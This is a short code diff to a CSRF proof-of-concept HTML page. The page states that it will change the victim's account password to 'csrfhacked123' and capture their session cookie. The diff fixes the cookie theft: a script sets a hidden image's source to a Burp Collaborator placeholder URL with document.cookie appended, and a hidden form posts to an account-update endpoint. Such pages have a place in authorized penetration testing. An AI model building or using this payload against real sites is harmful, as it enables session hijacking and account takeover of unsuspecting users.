@@ -8,7 +8,12 @@
     <p>This form will attempt to change your account password to "csrfhacked123" and capture your session cookie.</p>
 
     <!-- Hidden image to exfiltrate cookie via Burp Collaborator -->
-    <img src="https://[BURP_COLLABORATOR_URL]?cookie=" + document.cookie style="display:none;" onerror="console.log('Cookie sent')">
+    <img id="cookieImg" style="display:none;" onerror="console.log('Cookie sent via img')">
+
+    <script>
+        // Set img src dynamically to include cookie
+        document.getElementById('cookieImg').src = 'https://[BURP_COLLABORATOR_URL]?cookie=' + encodeURIComponent(document.cookie);
+    </script>
 
     <!-- CSRF Form - Account Password Update -->
     <form action="http://10.0.0.10/account/update" method="POST" id="csrfForm">
